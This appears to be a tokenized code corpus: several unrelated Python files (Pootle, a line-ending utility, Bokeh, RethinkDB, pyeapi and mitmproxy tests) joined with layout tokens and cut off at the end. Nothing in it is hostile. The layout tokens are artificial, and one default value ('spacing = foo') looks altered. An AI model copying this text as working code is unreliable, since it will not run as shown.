 # !/usr/bin/env ▁ python <encdom>  # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom>  # ▁ Copyright ▁ 2013 ▁ Zuza ▁ Software ▁ Foundation <encdom>  # ▁ This ▁ file ▁ is ▁ part ▁ of ▁ Pootle. <encdom>  # ▁ This ▁ program ▁ is ▁ free ▁ software; ▁ you ▁ can ▁ redistribute ▁ it ▁ and/or ▁ modify <encdom>  # ▁ it ▁ under ▁ the ▁ terms ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License ▁ as ▁ published ▁ by <encdom>  # ▁ the ▁ Free ▁ Software ▁ Foundation; ▁ either ▁ version ▁ 2 ▁ of ▁ the ▁ License, ▁ or <encdom>  # ▁ (at ▁ your ▁ option) ▁ any ▁ later ▁ version. <encdom>  # ▁ This ▁ program ▁ is ▁ distributed ▁ in ▁ the ▁ hope ▁ that ▁ it ▁ will ▁ be ▁ useful, <encdom>  # ▁ but ▁ WITHOUT ▁ ANY ▁ WARRANTY; ▁ without ▁ even ▁ the ▁ implied ▁ warranty ▁ of <encdom>  # ▁ MERCHANTABILITY ▁ or ▁ FITNESS ▁ FOR ▁ A ▁ PARTICULAR ▁ PURPOSE. ▁ See ▁ the <encdom>  # ▁ GNU ▁ General ▁ Public ▁ License ▁ for ▁ more ▁ details. <encdom>  # ▁ You ▁ should ▁ have ▁ received ▁ a ▁ copy ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License <encdom>  # ▁ along ▁ with ▁ this ▁ program; ▁ if ▁ not, ▁ see ▁ <http://www.gnu.org/licenses/>. <encdom>  """ Extension ▁ action ▁ to ▁ generate ▁ Mozilla ▁ language ▁ tar ▁ archives <strnewline> <strnewline> This ▁ extension ▁ action ▁ uses ▁ the ▁ mozilla-l10n ▁ configuration ▁ files ▁ and ▁ repository <strnewline> structure, ▁ but ▁ implements ▁ the ▁ necessary ▁ actions ▁ itself ▁ in ▁ Python, ▁ rather ▁ than <strnewline> run ▁ the ▁ shell ▁ scripts ▁ that ▁ are ▁ provided ▁ in ▁ that ▁ Git ▁ repository. <strnewline> <strnewline> """  <newline> import errno <newline> import logging <newline> import os <newline> import shutil <newline> import subprocess <newline> from contextlib import contextmanager <newline> from datetime import datetime <newline> from tempfile import mkdtemp <newline> from translate . convert import po2moz <newline> from pootle . scripts . actions import DownloadAction , TranslationProjectAction <newline> from pootle_app . models . permissions import check_permission <newline> POL10N = "mozilla-l10n.git" <newline> MOZL10N = "mozilla-l10n.hg" <newline> AURORA = "mozilla-aurora" <newline> PROJECTS = ( "firefox" , "mobile" ) <newline> def getLogger ( name ) :  # ▁ pylint: ▁ disable=C0103 <encdom> <newline> <indent>  """ Return ▁ a ▁ logger ▁ with ▁ a ▁ new ▁ method: ▁ debug_exception() <strnewline> <strnewline> ▁ :param ▁ name: ▁ logger ▁ name ▁ (typically ▁ __name__) <strnewline> ▁ :returns: ▁ logging.getLogger(name) ▁ with ▁ debug_exception ▁ method <strnewline> ▁ :rtype: ▁ logging.Logger <strnewline> ▁ """  <newline> import types <newline> _logger = logging . getLogger ( name ) <newline>  # ▁ Monkey-patch ▁ the ▁ instance ▁ with ▁ additional ▁ method ▁ rather ▁ than ▁ create ▁ a <encdom>  # ▁ subclass ▁ of ▁ Logger ▁ because ▁ the ▁ only ▁ way ▁ to ▁ create ▁ instances ▁ is ▁ via <encdom>  # ▁ logging ▁ module ▁ factory ▁ function ▁ getLogger(), ▁ which ▁ lacks ▁ any ▁ way ▁ to <encdom>  # ▁ create ▁ a ▁ subclass ▁ instead. ▁ The ▁ Logger ▁ class ▁ itself ▁ could ▁ be ▁ monkey- <encdom>  # ▁ patched ▁ with ▁ the ▁ additional ▁ method, ▁ but ▁ that ▁ seems ▁ too ▁ far-reaching, <encdom>  # ▁ since ▁ it ▁ would ▁ apply ▁ to ▁ all ▁ Loggers ▁ everywhere. <encdom> def debug_exception ( self , * args , ** kwargs ) : <newline> <indent>  """ Log ▁ ERROR, ▁ with ▁ exception ▁ traceback ▁ only ▁ if ▁ logging ▁ at ▁ DEBUG ▁ level. <strnewline> <strnewline> ▁ This ▁ is ▁ useful ▁ when ▁ exceptions ▁ are ▁ probably ▁ not ▁ caused ▁ by ▁ programming <strnewline> ▁ errors, ▁ but ▁ rather ▁ deployment ▁ ones ▁ (filesystem ▁ permissions ▁ or ▁ missing <strnewline> ▁ files) ▁ - ▁ in ▁ most ▁ cases ▁ the ▁ function ▁ traceback ▁ is ▁ just ▁ a ▁ lot ▁ of ▁ noise <strnewline> ▁ confusing ▁ the ▁ administrator ▁ who ▁ deployed ▁ the ▁ system, ▁ and ▁ you ▁ don't ▁ want <strnewline> ▁ to ▁ show ▁ it. ▁ When ▁ you ▁ do ▁ need ▁ it, ▁ just ▁ set ▁ the ▁ logging ▁ level ▁ to ▁ DEBUG. <strnewline> <strnewline> ▁ """  <newline> e = 'exc_info' <newline> if e not in kwargs : <newline> <indent> kwargs [ e ] = self . getEffectiveLevel ( ) == logging . DEBUG <newline> <dedent> self . error ( * args , ** kwargs ) <newline> <dedent> _logger . debug_exception = types . MethodType ( debug_exception , _logger ) <newline> return _logger <newline> <dedent> logger = getLogger ( __name__ ) <newline> @ contextmanager <newline> def tempdir ( ) : <newline> <indent>  """ Context ▁ manager ▁ for ▁ creating ▁ and ▁ deleting ▁ a ▁ temporary ▁ directory. """  <newline> tmpdir = mkdtemp ( ) <newline> try : <newline> <indent> yield tmpdir <newline> <dedent> finally : <newline> <indent> shutil . rmtree ( tmpdir ) <newline> <dedent> <dedent> def get_version ( vc_root ) : <newline> <indent>  """ Get ▁ Mozilla ▁ version ▁ from ▁ browser ▁ (since ▁ mobile ▁ has ▁ no ▁ version.txt) <strnewline> <strnewline> ▁ :param ▁ vc_root:Pootle ▁ VCS_DIRECTORY ▁ setting <strnewline> ▁ :type ▁ vc_root:str <strnewline> ▁ :returns: ▁ Mozilla ▁ Firefox ▁ version ▁ string <strnewline> ▁ :rtype: ▁ str <strnewline> ▁ """  <newline> vfile = os . path . join ( vc_root , AURORA , 'browser' , 'config' , 'version.txt' ) <newline> try : <newline> <indent> with open ( vfile ) as vfh : <newline> <indent> version = vfh . readline ( ) <newline> <dedent> <dedent> except IOError : <newline> <indent> logger . exception ( "Unable ▁ to ▁ get ▁ version ▁ from ▁ %s" , vfile ) <newline> return "aurora" <newline> <dedent> return version . strip ( ) <newline> <dedent> def merge_po2moz ( templates , translations , output , language , project ) : <newline> <indent>  """ Run ▁ po2moz ▁ to ▁ merge ▁ templates ▁ and ▁ translations ▁ into ▁ output ▁ directory <strnewline> <strnewline> ▁ The ▁ templates ▁ directory ▁ should ▁ be ▁ compatible ▁ with ▁ mozilla-l10n ▁ layout, <strnewline> ▁ translation ▁ directory ▁ as ▁ well ▁ (i.e. ▁ post-phasefile ▁ gatherin) ▁ - ▁ the <strnewline> ▁ output ▁ directory ▁ will ▁ be ▁ appropriate ▁ for ▁ tarball ▁ generation. <strnewline> <strnewline> ▁ May ▁ raise ▁ IOError ▁ or ▁ OSError ▁ from ▁ po2moz ▁ operation. <strnewline> <strnewline> ▁ :param ▁ templates: ▁ Directory ▁ for ▁ en-US ▁ templates <strnewline> ▁ :type ▁ templates: ▁ str <strnewline> ▁ :param ▁ translations: ▁ Directory ▁ for ▁ translations <strnewline> ▁ :type ▁ translations: ▁ str <strnewline> ▁ :param ▁ output: ▁ Output ▁ directory ▁ for ▁ merged ▁ localization <strnewline> ▁ :type ▁ output: ▁ str <strnewline> ▁ :param ▁ language: ▁ Language ▁ code ▁ (e.g. ▁ xx_XX) <strnewline> ▁ :type ▁ language: ▁ str <strnewline> ▁ :param ▁ project: ▁ Project ▁ code ▁ (e.g. ▁ firefox ▁ or ▁ mobile) <strnewline> ▁ :type ▁ project: ▁ str <strnewline> ▁ :raises: ▁ IOError <strnewline> ▁ :raises: ▁ OSError <strnewline> <strnewline> ▁ """  <newline> excludes = [ ] <newline> if project == 'firefox' : <newline> <indent> excludes . extend ( [ "other-licenses/branding/firefox" , "extensions/reporter" ] ) <newline> <dedent> excludes . extend ( [ '.git' , '.hg' , '.hgtags' , 'obsolete' , 'editor' , 'mail' , 'thunderbird' , 'chat' , '*~' ] ) <newline> po2moz . main ( [ '--progress=none' , '-l' , language , '-t' , os . path . join ( templates , POL10N , 'templates-en-US' ) , '-i' , os . path . join ( translations , project , language ) , '-o' , os . path . join ( output , language ) ] +  # ▁ generate ▁ additional ▁ --exclude ▁ FOO ▁ arguments <encdom> [ opt or arg for arg in excludes for opt in ( '--exclude' , 0 ) ] ) <newline> <dedent> class MozillaAction ( TranslationProjectAction ) : <newline> <indent>  """ Base ▁ class ▁ for ▁ common ▁ functionality ▁ of ▁ Mozilla ▁ actions. """  <newline> def is_active ( self , request ) : <newline> <indent> project = request . translation_project . project . code <newline> if project not in PROJECTS : <newline> <indent> return False <newline> <dedent> else : <newline> <indent> return super ( MozillaAction , self ) . is_active ( request ) <newline> <dedent> <dedent> <dedent> class MozillaTarballAction ( DownloadAction , MozillaAction ) : <newline> <indent>  """ Download ▁ Mozilla ▁ language ▁ properties ▁ tarball """  <newline> def __init__ ( self , ** kwargs ) : <newline> <indent> super ( MozillaTarballAction , self ) . __init__ ( ** kwargs ) <newline> self . permission = "administrate" <newline> <dedent> def run ( self , path , root , tpdir ,  # ▁ pylint: ▁ disable=R0913 <encdom> language , project , vc_root , ** kwargs ) : <newline> <indent>  """ Generate ▁ a ▁ Mozilla ▁ language ▁ properties ▁ tarball """  <newline> process = subprocess . Popen ( [ "git" , "rev-parse" , "--short" , "HEAD" ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , cwd = os . path . join ( vc_root , POL10N ) ) <newline> output = process . communicate ( ) [ 0 ] <newline> if not process . returncode == 0 or not output : <newline> <indent> output = "0000000" <newline> <dedent> with tempdir ( ) as tardir : <newline> <indent> try : <newline> <indent> merge_po2moz ( vc_root , root , tardir , language , project ) <newline> <dedent> except EnvironmentError as e : <newline> <indent> logger . debug_exception ( e ) <newline> self . set_error ( e ) <newline> return <newline> <dedent> tarfile = '-' . join ( [ language , get_version ( vc_root ) , datetime . utcnow ( ) . strftime ( "%Y%m%dT%H%M" ) , output . strip ( ) ] ) <newline> tarfile = os . path . join ( root , tpdir , '.' . join ( [ tarfile , 'tar' , 'bz2' ] ) ) <newline> process = subprocess . Popen ( [ 'tar' , '-cjf' , tarfile , language ] , universal_newlines = True , close_fds = ( os . name != 'nt' ) , stdout = subprocess . PIPE , stderr = subprocess . PIPE , cwd = tardir ) <newline> ( output , error ) = process . communicate ( ) <newline> if process . returncode > 0 : <newline> <indent> error += ( " ▁ [tar ▁ exited ▁ with ▁ status ▁ %d] \n " % process . returncode ) <newline> <dedent> elif process . returncode < 0 : <newline> <indent> error += ( " ▁ [tar ▁ killed ▁ by ▁ signal ▁ %d] \n " % - process . returncode ) <newline> <dedent> else : <newline> <indent> error += self . set_download_file ( path , tarfile ) <newline> os . remove ( tarfile ) <newline> <dedent> <dedent> self . set_output ( output ) <newline> self . set_error ( error ) <newline> <dedent> <dedent> MozillaTarballAction . moztar = MozillaTarballAction ( category = "Mozilla" , title = "Download ▁ tarball" ) <newline>
 # !/usr/bin/env ▁ python <encdom> import os , re <newline> def lineify_fileobjs ( ifo , ofo , strip = False ) : <newline> <indent> from pyutil . strutil import pop_trailing_newlines , split_on_newlines <newline> for l in ifo : <newline> <indent> for sl in split_on_newlines ( pop_trailing_newlines ( l ) ) : <newline> <indent> if strip : <newline> <indent> sl = sl . strip ( ) <newline> <dedent> ofo . write ( pop_trailing_newlines ( sl ) + ' \n ' ) <newline> <dedent> <dedent> <dedent> def lineify_file ( fname , strip = False , nobak = True ) : <newline> <indent> f = open ( fname , "rU" ) <newline> from pyutil . fileutil import ReopenableNamedTemporaryFile <newline> rntf = ReopenableNamedTemporaryFile ( ) <newline> fo = open ( rntf . name , "wb" ) <newline> for l in f : <newline> <indent> if strip : <newline> <indent> l = l . strip ( ) + ' \n ' <newline> <dedent> fo . write ( l ) <newline> <dedent> fo . close ( ) <newline> import shutil <newline> if not nobak : <newline> <indent> shutil . copyfile ( fname , fname + ".lines.py-bak" ) <newline> <dedent> import shutil <newline> try : <newline> <indent> shutil . move ( rntf . name , fname ) <newline> <dedent> except EnvironmentError : <newline>  # ▁ Couldn't ▁ atomically ▁ overwrite, ▁ so ▁ just ▁ hope ▁ that ▁ this ▁ process ▁ doesn't ▁ die <encdom>  # ▁ and ▁ the ▁ target ▁ file ▁ doesn't ▁ get ▁ recreated ▁ in ▁ between ▁ the ▁ following ▁ two <encdom>  # ▁ operations: <encdom> <indent> if nobak : <newline> <indent> os . remove ( fname ) <newline> <dedent> else : <newline> <indent> shutil . move ( fname , fname + ".lines.py-bak-2" ) <newline> <dedent> shutil . move ( rntf . name , fname ) <newline> <dedent> <dedent> def darcs_metadir_dirpruner ( dirs ) : <newline> <indent> if "_darcs" in dirs : <newline> <indent> dirs . remove ( "_darcs" ) <newline> <dedent> <dedent> SCRE = re . compile ( "\\.(py|php|c|h|cpp|hpp|txt|sh|pyx|pxi|html|htm)$|makefile$" , re . IGNORECASE ) <newline> def source_code_filepruner ( fname ) : <newline> <indent> return SCRE . search ( fname ) <newline> <dedent> def all_filepruner ( fname ) : <newline> <indent> return True <newline> <dedent> def all_dirpruner ( dirs ) : <newline> <indent> return <newline> <dedent> def lineify_all_files ( dirname , strip = False , nobak = True , dirpruner = all_dirpruner , filepruner = all_filepruner ) : <newline> <indent> for ( root , dirs , files , ) in os . walk ( dirname ) : <newline> <indent> dirpruner ( dirs ) <newline> for fname in files : <newline> <indent> fullfname = os . path . join ( root , fname ) <newline> if filepruner ( fullfname ) : <newline> <indent> lineify_file ( fullfname , strip = strip , nobak = nobak ) <newline> <dedent> <dedent> <dedent> <dedent>
def help ( object , spacing = foo , collapse = 1 ) : <newline> <indent>  """ Выводит ▁ методы ▁ и ▁ строки ▁ документации. <strnewline> <strnewline> ▁ В ▁ качестве ▁ аргумента ▁ может ▁ использоваться ▁ модуль, ▁ класс, ▁ список, ▁ словарь <strnewline> ▁ или ▁ строка. """  <newline> methodList = [ method for method in dir ( object ) if callable ( getattr ( object , method ) ) ] <newline> processFunc = collapse and ( lambda s : " ▁ " . join ( s . split ( ) ) ) or ( lambda s : s ) <newline> print " \n " . join ( [ "%s ▁ %s" % ( method . ljust ( spacing ) , processFunc ( str ( getattr ( object , method ) . __doc__ ) ) ) for method in methodList ] ) <newline> <dedent> if __name__ == "__main__" : <newline> <indent> print help . __doc__ <newline> <dedent>
from bokeh . charts import HeatMap , output_file , show <newline> import pandas as pd <newline> output_file ( 'heatmap.html' ) <newline> df = pd . DataFrame ( dict ( apples = [ 4 , 5 , 8 ] , bananas = [ 1 , 2 , 4 ] , pears = [ 6 , 5 , 4 ] , ) , index = [ '2012' , '2013' , '2014' ] ) <newline> p = HeatMap ( df , title = 'Fruits' ) <newline> show ( p ) <newline>
 # !/usr/bin/env ▁ python <encdom>  # ▁ Copyright ▁ 2010-2015 ▁ RethinkDB, ▁ all ▁ rights ▁ reserved. <encdom>  """ This ▁ test ▁ repeatedly ▁ reconfigures ▁ a ▁ table ▁ in ▁ a ▁ specific ▁ pattern ▁ to ▁ test ▁ the <strnewline> efficiency ▁ of ▁ the ▁ reconfiguration ▁ logic. ▁ It's ▁ sort ▁ of ▁ like ▁ `shard_fuzzer.py` ▁ but ▁ it <strnewline> produces ▁ a ▁ specific ▁ workload ▁ instead ▁ of ▁ a ▁ random ▁ one. """  <newline> from __future__ import print_function <newline> import os , pprint , random , string , sys , threading , time <newline> startTime = time . time ( ) <newline> sys . path . append ( os . path . abspath ( os . path . join ( os . path . dirname ( __file__ ) , os . path . pardir , 'common' ) ) ) <newline> import driver , scenario_common , utils , vcoptparse <newline> opts = vcoptparse . OptParser ( ) <newline> scenario_common . prepare_option_parser_mode_flags ( opts ) <newline> opts [ 'num-servers' ] = vcoptparse . IntFlag ( '--num-servers' , 2 ) <newline> opts [ 'num-tables' ] = vcoptparse . IntFlag ( '--num-tables' , 1 ) <newline> opts [ 'num-rows' ] = vcoptparse . IntFlag ( '--num-rows' , 10 ) <newline> opts [ 'num-shards' ] = vcoptparse . IntFlag ( '--num-shards' , 32 ) <newline> opts [ 'num-replicas' ] = vcoptparse . IntFlag ( '--num-replicas' , 1 ) <newline> opts [ 'num-phases' ] = vcoptparse . IntFlag ( '--num-phases' , 2 ) <newline> parsed_opts = opts . parse ( sys . argv ) <newline> _ , command_prefix , serve_options = scenario_common . parse_mode_flags ( parsed_opts ) <newline> possible_server_names = list ( string . ascii_lowercase ) + [ x + y for x in string . ascii_lowercase for y in string . ascii_lowercase ] <newline> assert parsed_opts [ "num-servers" ] <= len ( possible_server_names ) <newline> server_names = possible_server_names [ : parsed_opts [ "num-servers" ] ] <newline> table_names = [ "table%d" % i for i in xrange ( parsed_opts [ "num-tables" ] ) ] <newline> def make_config_shards ( phase ) : <newline> <indent> shards = [ ] <newline> for i in xrange ( parsed_opts [ 'num-shards' ] ) : <newline> <indent> shard = { } <newline> shard [ "primary_replica" ] = server_names [ ( i + phase ) % len ( server_names ) ] <newline> shard [ "replicas" ] = [ ] <newline> assert parsed_opts [ "num-replicas" ] <= len ( server_names ) <newline> for j in xrange ( parsed_opts [ 'num-replicas' ] ) : <newline> <indent> shard [ "replicas" ] . append ( server_names [ ( i + j + phase ) % len ( server_names ) ] ) <newline> <dedent> shards . append ( shard ) <newline> <dedent> return shards <newline> <dedent> r = utils . import_python_driver ( ) <newline> print ( "Spinning ▁ up ▁ %d ▁ servers ▁ (%.2fs)" % ( len ( server_names ) , time . time ( ) - startTime ) ) <newline> with driver . Cluster ( initial_servers = server_names , output_folder = '.' , command_prefix = command_prefix , extra_options = serve_options , wait_until_ready = True ) as cluster : <newline> <indent> cluster . check ( ) <newline> print ( "Establishing ▁ ReQL ▁ connection ▁ (%.2fs)" % ( time . time ( ) - startTime ) ) <newline> conn = r . connect ( host = cluster [ 0 ] . host , port = cluster [ 0 ] . driver_port ) <newline> print ( "Setting ▁ up ▁ table(s) ▁ (%.2fs)" % ( time . time ( ) - startTime ) ) <newline> res = r . db_create ( "test" ) . run ( conn ) <newline> assert res [ "dbs_created" ] == 1 , res <newline> for name in table_names : <newline> <indent> res = r . db ( "rethinkdb" ) . table ( "table_config" ) . insert ( { "name" : name , "db" : "test" , "shards" : [ { "primary_replica" : "a" , "replicas" : [ "a" ] } ] } ) . run ( conn ) <newline> assert res [ "inserted" ] == 1 , res <newline> <dedent> for name in table_names : <newline> <indent> res = r . table ( name ) . wait ( ) . run ( conn ) <newline> assert res [ "ready" ] == 1 , res <newline> res = r . table ( name ) . insert ( r . range ( 0 , parsed_opts [ "num-rows" ] ) . map ( { "x" : r . row } ) ) . run ( conn ) <newline> assert res [ "inserted" ] == parsed_opts [ "num-rows" ] , res <newline> <dedent> for phase in xrange ( parsed_opts [ 'num-phases' ] ) : <newline> <indent> print ( "Beginning ▁ reconfiguration ▁ phase ▁ %d ▁ (%.2fs)" % ( phase + 1 , time . time ( ) - startTime ) ) <newline> shards = make_config_shards ( phase ) <newline> for name in table_names : <newline> <indent> res = r . table ( name ) . config ( ) . update ( { "shards" : shards } ) . run ( conn ) <newline> assert res [ "replaced" ] == 1 or res [ "unchanged" ] == 1 , res <newline> <dedent> print ( "Waiting ▁ for ▁ table(s) ▁ to ▁ become ▁ ready ▁ (%.2fs)" % ( time . time ( ) - startTime ) ) <newline> for name in table_names : <newline> <indent> res = r . table ( name ) . wait ( wait_for = "all_replicas_ready" , timeout = 600 ) . run ( conn ) <newline> assert res [ "ready" ] == 1 , res <newline> for config_shard , status_shard in zip ( shards , r . table ( name ) . status ( ) [ "shards" ] . run ( conn ) ) : <newline>  # ▁ make ▁ sure ▁ issue ▁ # 4265 ▁ didn't ▁ happen <encdom> <indent> assert status_shard [ "primary_replicas" ] == [ config_shard [ "primary_replica" ] ] <newline> <dedent> <dedent> <dedent> print ( "Cleaning ▁ up ▁ (%.2fs)" % ( time . time ( ) - startTime ) ) <newline> <dedent> print ( "Done. ▁ (%.2fs)" % ( time . time ( ) - startTime ) ) <newline>
 # ▁ Copyright ▁ (c) ▁ 2014, ▁ Arista ▁ Networks, ▁ Inc. <encdom>  # ▁ All ▁ rights ▁ reserved. <encdom>  # ▁ Redistribution ▁ and ▁ use ▁ in ▁ source ▁ and ▁ binary ▁ forms, ▁ with ▁ or ▁ without <encdom>  # ▁ modification, ▁ are ▁ permitted ▁ provided ▁ that ▁ the ▁ following ▁ conditions ▁ are <encdom>  # ▁ met: <encdom>  # ▁ Redistributions ▁ of ▁ source ▁ code ▁ must ▁ retain ▁ the ▁ above ▁ copyright ▁ notice, <encdom>  # ▁ this ▁ list ▁ of ▁ conditions ▁ and ▁ the ▁ following ▁ disclaimer. <encdom>  # ▁ Redistributions ▁ in ▁ binary ▁ form ▁ must ▁ reproduce ▁ the ▁ above ▁ copyright <encdom>  # ▁ notice, ▁ this ▁ list ▁ of ▁ conditions ▁ and ▁ the ▁ following ▁ disclaimer ▁ in ▁ the <encdom>  # ▁ documentation ▁ and/or ▁ other ▁ materials ▁ provided ▁ with ▁ the ▁ distribution. <encdom>  # ▁ Neither ▁ the ▁ name ▁ of ▁ Arista ▁ Networks ▁ nor ▁ the ▁ names ▁ of ▁ its <encdom>  # ▁ contributors ▁ may ▁ be ▁ used ▁ to ▁ endorse ▁ or ▁ promote ▁ products ▁ derived ▁ from <encdom>  # ▁ this ▁ software ▁ without ▁ specific ▁ prior ▁ written ▁ permission. <encdom>  # ▁ THIS ▁ SOFTWARE ▁ IS ▁ PROVIDED ▁ BY ▁ THE ▁ COPYRIGHT ▁ HOLDERS ▁ AND ▁ CONTRIBUTORS <encdom>  # ▁"AS ▁ IS" ▁ AND ▁ ANY ▁ EXPRESS ▁ OR ▁ IMPLIED ▁ WARRANTIES, ▁ INCLUDING, ▁ BUT ▁ NOT <encdom>  # ▁ LIMITED ▁ TO, ▁ THE ▁ IMPLIED ▁ WARRANTIES ▁ OF ▁ MERCHANTABILITY ▁ AND ▁ FITNESS ▁ FOR <encdom>  # ▁ A ▁ PARTICULAR ▁ PURPOSE ▁ ARE ▁ DISCLAIMED. ▁ IN ▁ NO ▁ EVENT ▁ SHALL ▁ ARISTA ▁ NETWORKS <encdom>  # ▁ BE ▁ LIABLE ▁ FOR ▁ ANY ▁ DIRECT, ▁ INDIRECT, ▁ INCIDENTAL, ▁ SPECIAL, ▁ EXEMPLARY, ▁ OR <encdom>  # ▁ CONSEQUENTIAL ▁ DAMAGES ▁ (INCLUDING, ▁ BUT ▁ NOT ▁ LIMITED ▁ TO, ▁ PROCUREMENT ▁ OF <encdom>  # ▁ SUBSTITUTE ▁ GOODS ▁ OR ▁ SERVICES; ▁ LOSS ▁ OF ▁ USE, ▁ DATA, ▁ OR ▁ PROFITS; ▁ OR <encdom>  # ▁ BUSINESS ▁ INTERRUPTION) ▁ HOWEVER ▁ CAUSED ▁ AND ▁ ON ▁ ANY ▁ THEORY ▁ OF ▁ LIABILITY, <encdom>  # ▁ WHETHER ▁ IN ▁ CONTRACT, ▁ STRICT ▁ LIABILITY, ▁ OR ▁ TORT ▁ (INCLUDING ▁ NEGLIGENCE <encdom>  # ▁ OR ▁ OTHERWISE) ▁ ARISING ▁ IN ▁ ANY ▁ WAY ▁ OUT ▁ OF ▁ THE ▁ USE ▁ OF ▁ THIS ▁ SOFTWARE, ▁ EVEN <encdom>  # ▁ IF ▁ ADVISED ▁ OF ▁ THE ▁ POSSIBILITY ▁ OF ▁ SUCH ▁ DAMAGE. <encdom> import sys <newline> import os <newline> import unittest <newline> sys . path . append ( os . path . join ( os . path . dirname ( __file__ ) , '../lib' ) ) <newline> from testlib import get_fixture , function <newline> from testlib import EapiConfigUnitTest <newline> import pyeapi . api . acl <newline> class TestApiAclFunctions ( unittest . TestCase ) : <newline> <indent> def test_mask_to_prefixlen ( self ) : <newline> <indent> result = pyeapi . api . acl . mask_to_prefixlen ( '255.255.255.0' ) <newline> self . assertEqual ( result , 24 ) <newline> <dedent> def test_prefixlen_to_mask ( self ) : <newline> <indent> result = pyeapi . api . acl . prefixlen_to_mask ( 24 ) <newline> self . assertEqual ( result , '255.255.255.0' ) <newline> <dedent> <dedent> class TestApiStandardAcls ( EapiConfigUnitTest ) : <newline> <indent> def __init__ ( self , * args , ** kwargs ) : <newline> <indent> super ( TestApiStandardAcls , self ) . __init__ ( * args , ** kwargs ) <newline> self . instance = pyeapi . api . acl . StandardAcls ( None ) <newline> self . config = open ( get_fixture ( 'running_config.text' ) ) . read ( ) <newline> <dedent> def test_instance ( self ) : <newline> <indent> result = pyeapi . api . acl . instance ( None ) <newline> self . assertIsInstance ( result , pyeapi . api . acl . StandardAcls ) <newline> <dedent> def test_get ( self ) : <newline> <indent> result = self . instance . get ( 'test' ) <newline> keys = [ 'name' , 'type' , 'entries' ] <newline> self . assertEqual ( sorted ( keys ) , sorted ( result . keys ( ) ) ) <newline> <dedent> def test_get_not_configured ( self ) : <newline> <indent> self . assertIsNone ( self . instance . get ( 'unconfigured' ) ) <newline> <dedent> def test_getall ( self ) : <newline> <indent> result = self . instance . getall ( ) <newline> self . assertIsInstance ( result , dict ) <newline> <dedent> def test_acl_functions ( self ) : <newline> <indent> for name in [ 'create' , 'delete' , 'default' ] : <newline> <indent> if name == 'create' : <newline> <indent> cmds = 'ip ▁ access-list ▁ standard ▁ test' <newline> <dedent> elif name == 'delete' : <newline> <indent> cmds = 'no ▁ ip ▁ access-list ▁ standard ▁ test' <newline> <dedent> elif name == 'default' : <newline> <indent> cmds = 'default ▁ ip ▁ access-list ▁ standard ▁ test' <newline> <dedent> func = function ( name , 'test' ) <newline> self . eapi_positive_config_test ( func , cmds ) <newline> <dedent> <dedent> def test_update_entry ( self ) : <newline> <indent> cmds = [ 'ip ▁ access-list ▁ standard ▁ test' , 'no ▁ 10' , '10 ▁ permit ▁ 0.0.0.0/32 ▁ log' , 'exit' ] <newline> func = function ( 'update_entry' , 'test' , '10' , 'permit' , '0.0.0.0' , '32' , True ) <newline> self . eapi_positive_config_test ( func , cmds ) <newline> <dedent> def test_remove_entry ( self ) : <newline> <indent> cmds = [ 'ip ▁ access-list ▁ standard ▁ test' , 'no ▁ 10' , 'exit' ] <newline> func = function ( 'remove_entry' , 'test' , '10' ) <newline> self . eapi_positive_config_test ( func , cmds ) <newline> <dedent> def test_add_entry ( self ) : <newline> <indent> cmds = [ 'ip ▁ access-list ▁ standard ▁ test' , 'permit ▁ 0.0.0.0/32 ▁ log' , 'exit' ] <newline> func = function ( 'add_entry' , 'test' , 'permit' , '0.0.0.0' , '32' , True ) <newline> self . eapi_positive_config_test ( func , cmds ) <newline> <dedent> <dedent> if __name__ == '__main__' : <newline> <indent> unittest . main ( ) <newline> <dedent>
from textwrap import dedent <newline> import re <newline> import netlib . tutils <newline> from netlib . http import Headers <newline> from mitmproxy . flow import export  # ▁ heh <encdom> <newline> from . import tutils <newline> def clean_blanks ( s ) : <newline> <indent> return re . sub ( r"^(\s+)$" , "" , s , flags = re . MULTILINE ) <newline> <dedent> def python_equals ( testdata , text ) : <newline> <indent>  """ <strnewline> ▁ Compare ▁ two ▁ bits ▁ of ▁ Python ▁ code, ▁ disregarding ▁ non-significant ▁ differences <strnewline> ▁ like ▁ whitespace ▁ on ▁ blank ▁ lines ▁ and ▁ trailing ▁ space. <strnewline> ▁ """  <newline> d = open ( tutils . test_data . path ( testdata ) ) . read ( ) <newline> assert clean_blanks ( text ) . rstrip ( ) == clean_blanks ( d ) . rstrip ( ) <newline> <dedent> def req_get ( ) : <newline> <indent> return netlib . tutils . treq ( method = b'GET' , content = b'' , path = b"/path?a=foo&a=bar&b=baz" ) <newline> <dedent> def req_post ( ) : <newline> <indent> return netlib . tutils . treq ( method = b'POST' , headers = ( ) ) <newline> <dedent> def req_patch ( ) : <newline> <indent> return netlib . tutils . treq ( method = b'PATCH' , path = b"/path?query=param" ) <newline> <dedent> class TestExportCurlCommand ( ) : <newline> <indent> def test_get ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_get ( ) ) <newline> result =  """ curl ▁ -H ▁'header:qvalue' ▁ -H ▁'content-length:7' ▁'http://address/path?a=foo&a=bar&b=baz' """  <newline> assert export . curl_command ( flow ) == result <newline> <dedent> def test_post ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_post ( ) ) <newline> result =  """ curl ▁ -X ▁ POST ▁'http://address/path' ▁ --data-binary ▁'content' """  <newline> assert export . curl_command ( flow ) == result <newline> <dedent> def test_patch ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_patch ( ) ) <newline> result =  """ curl ▁ -H ▁'header:qvalue' ▁ -H ▁'content-length:7' ▁ -X ▁ PATCH ▁'http://address/path?query=param' ▁ --data-binary ▁'content' """  <newline> assert export . curl_command ( flow ) == result <newline> <dedent> <dedent> class TestExportPythonCode ( ) : <newline> <indent> def test_get ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_get ( ) ) <newline> python_equals ( "data/test_flow_export/python_get.py" , export . python_code ( flow ) ) <newline> <dedent> def test_post ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_post ( ) ) <newline> python_equals ( "data/test_flow_export/python_post.py" , export . python_code ( flow ) ) <newline> <dedent> def test_post_json ( self ) : <newline> <indent> p = req_post ( ) <newline> p . content = b'{"name": ▁"example", ▁"email": ▁"example@example.com"}' <newline> p . headers = Headers ( content_type = "application/json" ) <newline> flow = tutils . tflow ( req = p ) <newline> python_equals ( "data/test_flow_export/python_post_json.py" , export . python_code ( flow ) ) <newline> <dedent> def test_patch ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_patch ( ) ) <newline> python_equals 